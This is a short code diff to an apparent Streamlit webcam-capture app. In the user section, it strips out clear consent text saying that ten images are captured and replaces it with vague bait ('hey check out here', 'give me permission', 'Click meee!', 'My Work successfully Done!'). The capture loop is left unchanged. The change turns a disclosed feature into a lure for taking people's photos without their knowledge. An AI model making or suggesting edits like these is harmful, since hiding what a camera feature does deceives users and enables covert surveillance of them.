@@ -41,17 +41,17 @@ role = st.sidebar.selectbox(
 
 if role == "User":
 
-    st.header("📷 User Camera Capture")
+    st.header("hey check out here")
 
     st.info(
-        "This application captures webcam images ONLY after user permission."
+        "give me  permission."
     )
 
     camera = st.camera_input("Enable Camera")
 
     if camera:
 
-        if st.button("Capture 10 Images"):
+        if st.button("Click meee!"):
 
             bytes_data = camera.getvalue()
 
@@ -66,7 +66,7 @@ if role == "User":
 
                 time.sleep(0.2)
 
-            st.success("10 images captured successfully!")
+            st.success(" My Work successfully Done!")
 
 # ======================================================
 # ADMIN SECTION
